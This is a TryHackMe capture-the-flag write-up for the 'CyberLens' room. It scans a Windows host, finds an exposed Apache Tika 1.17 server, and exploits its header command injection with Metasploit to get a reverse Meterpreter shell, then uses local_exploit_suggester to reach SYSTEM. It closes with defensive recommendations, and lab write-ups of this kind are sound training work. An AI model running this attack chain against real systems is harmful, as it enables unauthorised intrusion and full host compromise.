# THM: CyberLens

**Category:** Web / Exploit / Windows  
**Difficulty:** Easy  
**Platform:** TryHackMe

---

## Overview

A Windows web server running Apache Tika — a content analysis toolkit — on an internal port is vulnerable to a header command injection CVE. Initial access is gained via Metasploit, and privilege escalation is achieved using a local exploit suggested by the post-exploitation recon module.

---

## Enumeration

### Initial Port Scan

```bash
nmap -sC -sV -oN nmap_initial.txt TARGET_IP
```

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.57 (Win64)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

The machine is **Windows**. Port 80 hosts a web app for extracting metadata from uploaded files. Source code review confirms static `.html` files — no server-side language like PHP or Flask visible.

SMB access without credentials was denied:

```bash
smbclient -L //TARGET_IP -N
# Returns: NT_STATUS_ACCESS_DENIED
```

### Full Port Scan

The default Nmap scan only hits common ports. Running a full-range scan with RustScan uncovers additional ports:

```bash
rustscan -a TARGET_IP -- -sV
```

Key additional findings:

```
5985/tcp  open  wsman         (WinRM)
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
```

Port **61777** is running **Apache Tika 1.17 Server** — a content analysis framework. The version number is visible in the HTTP response headers.

---

## Vulnerability Research

```bash
searchsploit apache tika
```

```
Apache Tika 1.15-1.17 - Header Command Injection  | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection      | windows/remote/46540.py
```

Two exploits are available for this exact version. The Python script (`46540.py`) is the more straightforward option for manual use, but both work.

**CVE:** The vulnerability is a **header injection** flaw in Apache Tika's server mode where a specially crafted HTTP header causes the server to execute arbitrary commands.

---

## Exploitation

### Metasploit Setup

```bash
msfconsole

search apache tika
use exploit/windows/http/apache_tika_jp2_rce
# or the header injection module depending on MSF version

set RHOSTS TARGET_IP
set RPORT 61777
set LHOST YOUR_IP
set LPORT 4444
run
```

The exploit runs successfully and returns a Meterpreter shell.

```bash
# Confirm access
getuid
# Retrieve user flag
shell
type C:\Users\CyberLens\Desktop\user.txt
```

---

## Privilege Escalation

### Local Exploit Suggester

With a Meterpreter session open, run the post-exploitation recon module:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

This scans the target for known local privilege escalation vulnerabilities and returns a ranked list. Running the **first suggested exploit** provides a SYSTEM shell.

```bash
# Retrieve root/admin flag
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- Always run a **full port scan** — Nmap's default scan covers only the top 1000 ports. Apache Tika was only discoverable because port 61777 was in scope
- Internal-facing services (here, Tika was presumably only meant to serve the web app) should not be directly accessible from external networks
- `searchsploit` against service name + version is a reliable first step for exploit identification
- `local_exploit_suggester` in Metasploit is an efficient post-exploitation enumeration step on Windows targets
- Apache Tika in server mode (`--server` flag) has a history of serious vulnerabilities — it should be firewalled from external access and kept updated

---

## Defensive Recommendations

| Finding | Recommendation |
|---------|---------------|
| Tika server exposed on all interfaces | Bind to `127.0.0.1` only; use a reverse proxy if external access is needed |
| Outdated Apache Tika (1.17) | Upgrade to latest stable version |
| Unpatched Windows local privesc | Apply Windows Update; use WSUS/SCCM for patch management |
| WinRM exposed externally | Restrict WinRM access to management VLAN via firewall rules |
